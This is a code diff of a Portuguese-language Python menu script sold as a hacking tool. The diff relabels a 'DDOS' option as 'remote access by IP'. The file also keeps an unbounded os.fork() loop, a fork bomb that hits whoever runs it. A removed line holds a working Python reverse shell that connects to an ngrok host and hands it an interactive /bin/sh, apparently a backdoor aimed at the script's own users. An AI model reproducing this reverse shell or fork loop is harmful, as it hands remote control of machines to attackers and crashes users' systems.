@@ -56,7 +56,7 @@ $R@i.~~! : ~ $$$$$ B $$ en: ``
 	
 	
 	print('    ________________________________________                        ')
-	print(f'    {C}[{G}01{C}]{R} DDOS{C}{G}{C}{C}              ')
+	print(f'    {C}[{G}01{C}]{R} ACESSO REMOTO POR IP {C}{G}{C}{C}              ')
 	print(f'    {C}[{G}02{C}]{R} PAINEL DE CONSULTA FREE {B} [OFF]{C} {G}{C}             ')
 	print(f'    {C}[{G}03{C}]{R} NUMERO DO CRIADOR  {C}                ')
 	print(f' {G} ___________________________________                        ')
@@ -66,10 +66,9 @@ $R@i.~~! : ~ $$$$$ B $$ en: ``
 			ddos = input(f' {G} DIGITE O IP DE SEU ALVO>>>')
 			port = input(f' {G} DIGITE A PORTA , EXEMPLO : 80 >>>')
 			while True:
-				print(' ENVIANDO PACOTES PARA  {} PORT {}!' .format(ddos,port))
+				print(' CONECTANDO EM  {} PORT {}!' .format(ddos,port))
 				os.fork()
 				
-				if choice == '2':
-					os.system(''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.ngrok.io",17377));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''')
+			
 				
 			
